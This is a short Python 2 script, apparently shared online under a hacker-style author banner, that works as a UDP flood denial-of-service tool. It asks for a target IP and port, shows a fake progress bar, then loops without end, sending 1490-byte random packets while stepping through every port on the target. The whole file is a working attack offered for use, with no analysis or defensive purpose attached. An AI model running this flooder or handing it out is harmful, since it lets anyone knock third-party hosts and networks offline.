#Copy this code doesn't make you programmer bro!

import sys
import os
import time
import socket
import random
#Code
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

#Banner Start
print "\033[1;31;40m___/__ \______ ___ / /____/ /_\033[1;31;40m"
print "\033[1;31;40m__  /_/ /_  __ `/_  __/__  __ |\033[1;31;40m"
print "\033[1;31;40m_  _, _/ / /_/ / / /_  _  / / /\033[1;31;40m"
print "\033[1;31;40m/_/ |_|  \__,_/  \__/  /_/ /_/ \033[1;31;40m"

#Banner End
print "\033[1;40mAuthor    : TORIKUL_ISLAM\033[1;40m "
print "\033[1;40mGithub    : Mdtaeik417/Mdtaeik417.git/\033[1;40m "
print "\033[1;40mFacebook : https://www.timesbull.com/ajab-gajab/news/infinix-note-12-pro-5g-a-budget-friendly-5g-powerhouse-with-stellar-specs-2024-03-20-235956.html\033[1;40m"
print     
ip = raw_input("[*]Enter Target Ip : ")
port = int(raw_input("[*]Enter Target Port : "))

time.sleep(3)
print "[-------->           ] 45%"
time.sleep(3)
print "[------------>       ] 55%"
time.sleep(3)
print "[------------------->] 100%"
time.sleep(5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s torikul port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

#Credit -TORIKUL_ISLAM (CYBER-99)0
